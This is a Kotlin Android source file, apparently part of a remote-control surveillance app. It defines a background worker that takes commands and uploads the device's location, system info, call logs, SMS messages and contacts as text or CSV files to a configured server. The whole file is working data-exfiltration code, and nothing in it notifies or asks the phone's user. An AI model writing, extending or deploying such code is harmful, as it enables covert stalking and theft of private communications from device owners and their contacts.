package com.example.lta

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File

class DataFetchWorker(private val appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {

    private val apiClient = ApiClient(appContext.getString(R.string.server_base_url))
    private val manualDataManager = ManualDataManager(appContext)
    private val systemInfoManager = SystemInfoManager(appContext)

    companion object {
        const val KEY_COMMAND = "COMMAND"
        private const val TAG = "DataFetchWorker"
    }

    override suspend fun doWork(): Result {
        val command = inputData.getString(KEY_COMMAND)
        if (command == null) {
            Log.e(TAG, "Worker started without a command.")
            return Result.failure()
        }
        Log.d(TAG, "Executing command: $command")

        return withContext(Dispatchers.IO) {
            try {
                val success = when (command) {
                    "get_location" -> fetchAndSendLocation()
                    "get_system_info" -> fetchAndSendSystemInfo()
                    "get_call_logs" -> fetchAndSendCsv("CallLogs", manualDataManager::getCallLogsAsCsv)
                    "get_sms" -> fetchAndSendCsv("SMS", manualDataManager::getSmsAsCsv)
                    "get_contacts" -> fetchAndSendCsv("Contacts", manualDataManager::getContactsAsCsv)
                    else -> {
                        Log.w(TAG, "Unknown command: $command")
                        false
                    }
                }
                if (success) Result.success() else Result.retry()
            } catch (e: Exception) {
                Log.e(TAG, "Error executing command: $command", e)
                Result.failure()
            }
        }
    }

    private suspend fun fetchAndSendLocation(): Boolean {
        if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Location permission not granted.")
            apiClient.uploadText("Location command failed: Permission not granted.")
            return false
        }
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)
        val location = fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
        return if (location != null) {
            val message = "📍 Location Update:\nLat: ${location.latitude}\nLon: ${location.longitude}\nAccuracy: ${location.accuracy}m"
            apiClient.uploadText(message)
        } else {
            apiClient.uploadText("📍 Location Update:\nFailed to get location (was null).")
            false
        }
    }

    private suspend fun fetchAndSendSystemInfo(): Boolean {
        val networkInfo = systemInfoManager.getNetworkInfo()
        val batteryInfo = systemInfoManager.getBatteryInfo()
        val systemInfoMessage = "⚙️ System Info:\nNetwork: $networkInfo\n$batteryInfo"
        return apiClient.uploadText(systemInfoMessage)
    }

    private suspend fun fetchAndSendCsv(dataType: String, csvProvider: () -> String): Boolean {
        val csvData = csvProvider()
        if (csvData.lines().size <= 1) {
            Log.d(TAG, "No data to export for $dataType")
            return apiClient.uploadText("Command failed: No $dataType data found.")
        }

        val file = File.createTempFile(dataType.lowercase(), ".csv", appContext.cacheDir)
        file.writeText(csvData)

        val success = apiClient.uploadFile(file, "Exported $dataType from device.")
        file.delete()
        return success
    }
}
